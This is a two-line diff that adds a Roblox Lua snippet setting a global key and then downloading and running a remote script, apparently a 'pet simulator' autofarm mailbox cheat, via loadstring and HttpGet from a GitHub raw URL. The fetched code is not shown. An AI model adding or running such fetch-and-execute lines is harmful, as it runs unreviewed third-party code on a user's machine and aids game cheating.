@@ -1,0 +1,2 @@
+_G.Key = ("alexgeorge343")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Pewcio241/pet-simulator-autofarm/main/mailbox.lua"))()
